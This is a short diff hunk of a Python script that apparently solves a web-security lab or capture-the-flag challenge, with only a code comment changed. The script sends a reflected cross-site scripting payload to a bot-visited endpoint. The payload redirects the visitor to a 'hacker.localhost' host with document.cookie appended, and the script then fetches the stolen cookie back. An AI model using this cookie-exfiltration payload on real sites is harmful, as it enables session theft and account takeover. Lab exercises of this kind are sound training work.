@@ -148,8 +148,8 @@ while True:
 	m = pat0.match(line)
 	if m:
 		url = "http://challenge.localhost:80/visit"
-		xss = '<script>window.location.href="http://hacker.localhost:30080/?"%2bdocument.cookie</script>' # we url encode plus, since auto url encode only on top level not for nested url
-		data = {"url": f'http://challenge.localhost:80/echo?echo={xss}'}
+		xss = '<script>window.location.href="http://hacker.localhost:30080/?"%2bdocument.cookie</script>' # we url encode plus, since plus can be used as space place holder in
+		data = {"url": f'http://challenge.localhost:80/echo?echo={xss}'}                                  # the query part of a url for html5 next to %20
 		r = requests.get(url, params=data)
 		url = "http://hacker.localhost:30080/ret"
 		r = requests.get(url)
